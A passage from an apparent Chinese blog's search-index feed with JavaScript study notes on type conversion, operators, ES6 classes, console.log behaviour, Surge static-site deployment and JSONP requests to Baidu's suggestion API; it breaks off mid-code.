数据类型转换</strong><br><code>1.其它数据类型 转为 String类型</code><br>强转：  toString()  String()<br>toString() 【只能把number 和 boolean 转换为字符串！undefined、Null都没有原型链，无法强转】<br>举例：  var a &#x3D; 100;<br>a不是一个对象，a.toString(),会瞬间把a包装成一个对象，这类对象叫包装对象，其中’. ‘为属性访问运算符。</p><p>String()构造函数，强大！【可以把number、boolean、undefined、null、字面量(固定取值) 转换为字符串！】</p><p>隐式转换：方便！（’+’遇到 字符串，直接解释为 拼接字符串，故 字符串前直接加’+’ 即可对其完成类型转换）<br>【运算符 左右两侧数据类型不一致时，运算符会悄悄的把一种数据类型转为另一种数据类型，保持数据类型一致。】</p><p><code>2.其它数据类型 转为 Number类型</code><br>Number() 构造函数，或者前面加上”+” 【把”123”、”   123   “转成123、空格字符串”     “或空串”” 转成0、”100px”转成NaN】<br>特殊：Number(false)和Number(Null) 都转为 0。Number(true) 转为 1。Number(undefined) 转为 NaN。</p><p>parseInt转为整数 parseFloat转为小数【能转则转！”100px”转成100，”px100”转成NaN】</p><p><code>3.其它数据类型 转为 Boolean类型</code><br>Boolean() 构造函数，强转<br> 【转为false: 0, null, NaN, undefined, 空串””。其他情况都转为true】</p><p><strong>四、运算符</strong><br>       &#x2F;&#x2F; 运算符：具有某些特定功能的符号  +  -  *  &#x2F;  %<br>        &#x2F;&#x2F; 操作数： 1 + 1 运算符号两侧的数据都是 操作数<br>        &#x2F;&#x2F; 要求：运算的时候，左右两侧的数据类型必须保持一致。如果不一致，会发生类型转换。</p><pre><code>    //  从功能上划分：【运算后，都会整体返回一个布尔值。】    //     算术运算符    //     递增递减运算符( ++ 在前，整体是一个新值 ，++在后整体是一个旧值)    //     关系运算符【算数、递增递减、和关系运算符中，会把两边的 操作数 隐式转换为Number类型】    //     逻辑运算符（&amp;&amp;一假全假、||一真全真、!。注意：&amp;&amp;碰到第一个为false，便会立即中断后续的语句。|| 碰到第一个为true，也会立即中断后续的语句。）    //     赋值运算符    // 从操作数上划分    //    一元运算符  单目运算符    //    二元运算符  双目运算符    //    三元运算符  三目运算符  三元表达式 （表达式 ? 结果A : 结果B）</code></pre><p>【拓展】<br>1.!&#x3D;隐式类型转换 不判断数据类型。!&#x3D;&#x3D;判断数据类型（&#x3D;&#x3D;与&#x3D;&#x3D;&#x3D;同理）</p><p>2.后端传递数据过来进行判断时，为数组时判断数组的长度，为对象时用if(Object.keys(obj).length){}，判断对象属性数组长度。<br>如果可能传过来null，也有可能传过来数组，并且不希望空数组执行语句，则可以if(res &amp;&amp; res.length){}，res和res.length位置不能换，如果为null，则直接返回null，后面的res.length不执行，从而不报错，如果为[]，则res.length为0，返回0，也将空数组去除了。</p><p>3.在js中根本不存在真正的空对象，理解这一点至关重要！即使时最简单的{}对象也会包含从Object.prototype继承而来的属性和方法。我们提到的”空对象”只是说这个对象没有自有属性，不考虑它是否有继承而来的属性。<br>{}、null、[]的区别【注：在转化为 布尔值时，只有null转为false！[]、{}都会被转为true。】<br>{}是一个不完全空的对象，原型链上有Object；null为原型链顶端，因此Object.prototype.<strong>proto</strong>&#x3D;&#x3D;&#x3D;null为true。<br>null是完全空对象，原型链也没有。<br>[]原型链上还比{}多一个Array。</p><p>4.使用 三元运算符能做到的，if else语句也能做到。只是三元运算符不仅能用于js，也能与html标签结合使用：</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Surge发布前端项目</title>
      <link href="/posts/shi-yong-surge-fa-bu-qian-duan-xiang-mu/"/>
      <url>/posts/shi-yong-surge-fa-bu-qian-duan-xiang-mu/</url>
      
        <content type="html"><![CDATA[<p>Surge是面向前端开发人员的静态web发布网站。</p><h4 id="1-安装node"><a href="#1-安装node" class="headerlink" title="1. 安装node"></a>1. 安装node</h4><h4 id="2-安装surge"><a href="#2-安装surge" class="headerlink" title="2. 安装surge"></a>2. 安装surge</h4><p>npm install –global surge</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">操作命令：</span><br><span class="line">$ surge --help</span><br><span class="line">  surge – single command web publishing. (v0.23.1)</span><br><span class="line">  Usage:</span><br><span class="line">    surge &lt;project&gt; &lt;domain&gt;</span><br><span class="line">  Options:</span><br><span class="line">    -a, --add           adds user to list of collaborators (email address)</span><br><span class="line">    -r, --remove        removes user from list of collaborators (email address)</span><br><span class="line">    -V, --version       show the version number</span><br><span class="line">    -h, --help          show this help message</span><br><span class="line">  Additional commands:</span><br><span class="line">    surge whoami        show who you are logged in as</span><br><span class="line">    surge logout        expire local token</span><br><span class="line">    surge login         only performs authentication step</span><br><span class="line">    surge list          list all domains you have access to</span><br><span class="line">    surge teardown      tear down a published project</span><br><span class="line">    surge plan          set account plan  Guides:</span><br><span class="line">    Getting started     surge.sh/help/getting-started-with-surge</span><br><span class="line">    Custom domains      surge.sh/help/adding-a-custom-domain</span><br><span class="line">    Additional help     surge.sh/help</span><br><span class="line">  When in doubt, run surge from within your project directory.</span><br></pre></td></tr></table></figure><h4 id="3-进入待发布的目录"><a href="#3-进入待发布的目录" class="headerlink" title="3.进入待发布的目录"></a>3.进入待发布的目录</h4><p>cd <to-public-dir></p><h4 id="4-发布"><a href="#4-发布" class="headerlink" title="4.发布"></a>4.发布</h4><p>【可直接命令（<code>surge + project相对路径 + 自定义域名</code>）进行project的发布，不过域名可能会冲突！！！】</p><p>$ surge<br>   Welcome to surge! (surge.sh)<br>   Login (or create surge account) by entering email &amp; password.<br>          email: <a href="mailto:&#x6d;&#x65;&#64;&#120;&#105;&#x65;&#120;&#105;&#97;&#x6e;&#98;&#105;&#110;&#46;&#x63;&#110;">me@xiexianbin.cn</a><br>       password: Surge2022<br>   Running as <a href="mailto:&#109;&#101;&#64;&#120;&#x69;&#x65;&#120;&#x69;&#97;&#110;&#98;&#x69;&#110;&#x2e;&#99;&#110;">me@xiexianbin.cn</a> (Student)<br>        project: D:\code\public<br>domain: fallacious-action.surge.sh 此域名可 自定义为 *****.surge.sh，域名太短可能会发生冲突，配置失效！！<br>     encryption: *.surge.sh, surge.sh (185 days)<br>             IP: 138.197.235.123<br>   Success! - Published to fallacious-action.surge.sh</p><p><code>发布成功后，访问指定ip或域名即可在线看到 此project。</code><br><code>撤销已发布项目 使用命令 surge teardown+域名。</code><br><code>亲测速度还可以，很方便。可以自定义 多个域名，但共享同一个ip</code></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Class构造器</title>
      <link href="/posts/class-gou-zao-qi/"/>
      <url>/posts/class-gou-zao-qi/</url>
      
        <content type="html"><![CDATA[<p>JavaScript 语言中，生成实例对象的传统方法是通过构造函数。ES6 的class可以看作只是一个语法糖，它的绝大部分功能，ES5 都可以做到，新的class写法只是让对象原型的写法更加清晰更像面向对象编程的语法而已。所以ES6 的类，完全可以看作 构造函数的另一种写法。</p><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>constructor方法是类的默认方法，通过new命令生成对象实例时，自动调用该方法。一个类必须有constructor方法，如果没有显式定义，一个空的constructor方法会被默认添加。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">等同于</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">  <span class="comment">// 构造函数</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实例-属性和方法、静态-属性和方法"><a href="#实例-属性和方法、静态-属性和方法" class="headerlink" title="实例 属性和方法、静态 属性和方法"></a>实例 属性和方法、静态 属性和方法</h2><p>定义在类体中的属性称为实例属性，定义在类体中的方法称为实例方法。如下，temp、name、age就是实例属性，sayName方法就是实例方法。</p><p>同理，直接通过类调用的，而不是通过实例对象调用的。即只能通过“类名.names”或“类名.fn()”方式访问的属性和方法，便是 静态属性、静态方法。不会被实例继承</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">        <span class="comment">// 实例属性  【常用】</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">        <span class="comment">// 实例方法  不常用</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">sayName</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;i am &quot;</span>, <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 实例属性</span></span><br><span class="line">    temp = <span class="string">&#x27;briup&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 给原型对象 添加 公有方法 【常用】</span></span><br><span class="line">    <span class="title function_">say</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我是Person对应的 原型对象上的 公有say方法&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//静态属性、静态方法</span></span><br><span class="line">    <span class="keyword">static</span> names = <span class="string">`我是 Person类 中的 静态属性`</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">staticSay</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`我是 Person类 中的 静态方法，只能在 Person作为对象时，通过属性访问运算符&#x27;.&#x27; 使用。`</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在 Person对应的 原型对象上 添加 公有属性color</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">color</span> = <span class="string">&#x27;red&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;Ronda&#x27;</span>, <span class="number">22</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">temp</span>);  <span class="comment">// briup</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;temp&#x27;</span>));  <span class="comment">// true 【写在constructor之外的temp为 实例属性，并非其 原型对象上的 公有属性】</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">__proto__</span>.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;temp&#x27;</span>));  <span class="comment">// false  实例化对象p1的 原型对象上没有temp属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">say</span>());  <span class="comment">// ‘我是Person对应的 原型对象上的 公有say方法’</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property">names</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="title function_">staticSay</span>());</span><br></pre></td></tr></table></figure><h3 id="关于-实例属性的-补充："><a href="#关于-实例属性的-补充：" class="headerlink" title="关于 实例属性的 补充："></a>关于 实例属性的 补充：</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>&#123;</span><br><span class="line">  num = <span class="number">1</span>;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">num</span>)&#123;  </span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">num</span> = num;</span><br><span class="line">  &#125;</span><br><span class="line">  num = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> people = <span class="keyword">new</span> <span class="title class_">People</span>(<span class="number">2</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(people.<span class="property">num</span>);  <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>等同于</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>&#123;</span><br><span class="line"> <span class="title function_">constructor</span>(<span class="params">num</span>)&#123;  </span><br><span class="line">   <span class="comment">//不论在类内部哪里定义num属性，在constructor都会提前</span></span><br><span class="line">   <span class="variable language_">this</span>.<span class="property">num</span> = <span class="number">1</span>;</span><br><span class="line">   <span class="variable language_">this</span>.<span class="property">num</span> = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">   <span class="variable language_">this</span>.<span class="property">num</span> = num;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="class中的继承"><a href="#class中的继承" class="headerlink" title="class中的继承"></a>class中的继承</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">        <span class="comment">// 在里面写的属性和方法 会挂载到 实例对象上</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">work</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;work..&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//  在constructor外面写的方法 会挂载在 原型对象上</span></span><br><span class="line">    <span class="title function_">say</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;say..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> stu = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&#x27;张三&#x27;</span>, <span class="number">18</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(stu);<span class="comment">// Student &#123;name: &#x27;张三&#x27;, age: 18, work: ƒ&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承使用的关键字 extends、super</span></span><br><span class="line"><span class="comment">// 声明一个班长类 班长类去继承学生类的一些属性</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Monitor</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Student</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name, age, id</span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>(name, age);<span class="comment">// super调用父类的构造函数</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">id</span> = id;<span class="comment">//增加自己的 实例属性</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 父类的 公有属性和私有属性 都可以被继承</span></span><br><span class="line"><span class="keyword">let</span> mon1 = <span class="keyword">new</span> <span class="title class_">Monitor</span>(<span class="string">&#x27;李四&#x27;</span>, <span class="number">18</span>, <span class="number">01</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(mon1);<span class="comment">// Monitor &#123;name: &#x27;李四&#x27;, age: 18, id: 1, work: ƒ&#125;</span></span><br><span class="line">mon1.<span class="title function_">say</span>();<span class="comment">// say..</span></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_51066068/article/details/124705885#t7">关于super关键字，详见ES6中Class类构造函数、实例、原型属性和方法、继承extends、super关键字_es6中类的原型属性和原型方法_The..Fuir的博客-CSDN博客</a> </p><h2 id="class的set设置器和get访问器"><a href="#class的set设置器和get访问器" class="headerlink" title="class的set设置器和get访问器"></a>class的set设置器和get访问器</h2><p>get 关键字将对象属性与函数进行绑定,当属性被访问时,对应函数被执行。</p><p>set 关键字将对象属性与函数进行绑定,当属性被赋值时,对应函数被执行。</p><p>【注意：实例对象的 属性名，与绑定该属性的 函数名 不能 同名】</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address, age</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_address</span> = address;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置器和访问器</span></span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">address</span>() &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;get启用了&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">_address</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">set</span> <span class="title function_">address</span>(<span class="params">value</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;set启用了&#x27;</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_address</span> = value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> stu = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&#x27;北京&#x27;</span>, <span class="number">18</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(stu.<span class="property">address</span>);<span class="comment">//不加下划线 相当于通过get set去访问【输出“get启用了  北京”】</span></span><br><span class="line"><span class="comment">// console.log(stu._address); //加上下划线 相当于是正常的属性访问</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// stu.address = &#x27;上海&#x27;;</span></span><br><span class="line"><span class="comment">// stu._address = &#x27;上海&#x27;; //加上下划线，是正常的修改属性值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(stu);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>console.log(obj)探讨</title>
      <link href="/posts/console-log-obj-tan-tao/"/>
      <url>/posts/console-log-obj-tan-tao/</url>
      
        <content type="html"><![CDATA[<p>1.Log (anObject)的输出具有误导性; 只有在控制台中展开 &gt; 时才能解析显示的对象的状态。它不是您在 console.log 对象时对象的状态。<br>相反，尝试 console.log (Object.keys ()) ，或者甚至console.log(JSON.parse(JSON.stringify(obj))) ，您将看到键，或者调用 console.log 时对象的状态。<br>2.来自 MDN：“不要使用console.log(obj)，使用console.log(JSON.parse(JSON.stringify(obj)))。这样你就可以确定你obj在记录它的那一刻看到了它的价值。否则，许多浏览器提供了一个实时视图，随着值的变化而不断更新。这可能不是你想要的想。” <a href="https://developer.mozilla.org/en-US/docs/Web/API/Console/log">developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;API&#x2F;Console&#x2F;log</a> – 拉菲</p><h2 id="详见："><a href="#详见：" class="headerlink" title="详见："></a>详见：</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Console/log">console.log - Web API 接口参考 | MDN</a><br><a href="https://stackoverflow.com/questions/17546953/cant-access-object-property-even-though-it-shows-up-in-a-console-log/39606500">javascript - Can’t access object property, even though it shows up in a console log - Stack Overflow</a></p><h2 id="我的理解（可能有误，仅当参考）："><a href="#我的理解（可能有误，仅当参考）：" class="headerlink" title="我的理解（可能有误，仅当参考）："></a>我的理解（可能有误，仅当参考）：</h2><p>1.如下图，只有在控制台点击“箭头”后，里面看到的 才是 对象当前状态的 真实值。若只能console.log()输出，而无法 点击。就使用Object.keys(obj)打印 对象 实时存在 的key。<br><img src="/posts/console-log-obj-tan-tao/1.webp" alt="console.log(obj)探讨-1"></p><div class="tip sync"><p>问题：在学习koa时ctx.request中 log 出来并没有body属性，使用let { body } &#x3D; ctx.request 可以取出请求体body，请问原理是什么呢？正常来讲不应该是 ctx.request中存在body这个key才能取出值来么？</p></div><p>同理：</p><p>console.log(Object.keys(ctx.request));</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打印结果如下，可见ctx.request对象实际是由body属性的，只是当时log的不是 真实值。</span></span><br><span class="line">[ <span class="string">&#x27;app&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;req&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;res&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;ctx&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;response&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;originalUrl&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;body&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;rawBody&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;params&#x27;</span> ]</span><br></pre></td></tr></table></figure><p>而直接console.log(ctx.request)只能拿到 请求报文，是拿不到对象的真实值的：<br><img src="/posts/console-log-obj-tan-tao/2.webp" alt="console.log(obj)探讨-2"><br>2.若想获得 log 那一刻，obj 当时的 值，可以console.log(JSON.parse(JSON.stringify(obj)))。【未验证】</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> koa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>联想搜索之百度Jsonp</title>
      <link href="/posts/lian-xiang-sou-suo-zhi-bai-du-jsonp/"/>
      <url>/posts/lian-xiang-sou-suo-zhi-bai-du-jsonp/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是-回调函数？"><a href="#什么是-回调函数？" class="headerlink" title="什么是 回调函数？"></a>什么是 回调函数？</h2><p>在 JavaScript 中，回调函数是指将一个函数作为参数传递给另一个函数，以在某些操作完成后通知调用者。当操作完成时，被调用的函数（即回调函数）将被调用，以执行某些指定的操作或返回一些数据。回调函数通常被用来处理异步操作，如定时器、Ajax 请求、事件处理器等。</p><h2 id="什么是-JSONP-？"><a href="#什么是-JSONP-？" class="headerlink" title="什么是 JSONP ？"></a>什么是 JSONP ？</h2><p>JSONP（JSON with Padding）是一种通过在页面中 动态创建<code>script标签</code>，以实现跨域请求数据的技术。它是一种基于 回调函数的技术，它可以绕过浏览器的同源策略，使得页面可以请求来自不同域名的数据。</p><p>在使用 JSONP 技术时，需要在页面中 动态创建一个<code>script标签</code>，并 将请求的 URL 包装在一个回调函数中。服务器在返回数据时，将数据作为回调函数的参数返回，这样浏览器就可以直接执行该函数，并将数据作为函数的参数进行处理。</p><p>JSONP 的优点是它可以绕过浏览器的同源策略，可以请求来自不同域名的数据，而不会因为跨域而受到限制。缺点是它只支持 GET 请求，并且请求的数据需要由服务器来控制和返回，因此它的灵活性和安全性相对较低。此外，由于 JSONP 依赖于回调函数，在处理复杂的请求时，可能会导致代码难以维护和调试。</p><h2 id="能通过JSONP获取数据的接口-需要有什么条件？"><a href="#能通过JSONP获取数据的接口-需要有什么条件？" class="headerlink" title="能通过JSONP获取数据的接口 需要有什么条件？"></a>能通过JSONP获取数据的接口 需要有什么条件？</h2><h3 id="1-支持-回调函数："><a href="#1-支持-回调函数：" class="headerlink" title="1.支持 回调函数："></a>1.支持 回调函数：</h3><p>JSONP 的原理是通过在页面中动态创建<code>script标签</code>来请求数据，因此接口返回的数据必须以 JavaScript 函数的形式返回，这个函数名一般是通过 URL 参数传递的。</p><h3 id="2-跨域请求："><a href="#2-跨域请求：" class="headerlink" title="2.跨域请求："></a>2.跨域请求：</h3><p>由于浏览器的同源策略限制，一般情况下只能在同域名、同协议、同端口下进行 AJAX 请求。而 JSONP 利用了动态创建<code>script标签</code>不受同源策略的限制，因此可以实现跨域请求。但是，需要注意的是 JSONP 也有安全性问题，因为它依赖于服务端返回的 JavaScript 代码，因此需要确保接口的可信度。</p><p>总之，JSONP 只适用于特定的接口，而不是适用于所有请求文件。如果接口不支持回调函数或者跨域请求，那么就不能使用 JSONP 技术。</p><h2 id="基础就这些，，，进入正题："><a href="#基础就这些，，，进入正题：" class="headerlink" title="基础就这些，，，进入正题："></a>基础就这些，，，进入正题：</h2><p>先上百度接口 <a href="https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su?wd=">https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su?wd=</a></p><p>wd 为搜索关键词，</p><p>cb 比较特殊，是 提前为 回调函数 定义好的 缩写，作为查询字符串的 键值。此时 直接返回自定义函数名 fn。</p><p><img src="/posts/lian-xiang-sou-suo-zhi-bai-du-jsonp/1.webp" alt="联想搜索之百度jsonp-1"></p><p> 若 不使用 cb 作为 回调函数的 键名，比如设定为 callBack，此时返回的是 挂载在window上的baidu对象中的sug方法。（如下），</p><p><img src="/posts/lian-xiang-sou-suo-zhi-bai-du-jsonp/2.webp" alt="联想搜索之百度jsonp-2"></p><div class="tip cogs"><p>我对script标签src请求接口，并引入js资源的理解：</p></div><p>通过此种方式等同于直接引入一个js模块（同cdn引入第三方库），该文件的js代码相当于直接插入到当前文件，当然可以执行其中的代码。</p><p>接口分析：目前接口中是一个 执行语句。调用了一个函数，（自定义函数fn、或者是window.baidu对象中的sug方法），给该函数 传递 了一个 对象 作为 实参。也就是说，通过src直接在当前文件中插入了 一个执行语句（携带有实参的函数）。</p><div class="tip sync"><p>重点是，需要在当前文件中提前 声明 该函数 以备通过src引入执行语句后 立即执行fn、或者是window.baidu对象中的sug方法（抛出实参，或进一步加工数据）</p></div><p>若 script标签 还没有返回 接口提供的 js执行语句，该函数不会被执行。也就是说，在 渲染data 之前，加工数据的执行语句 会一直 等待执行。。。。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 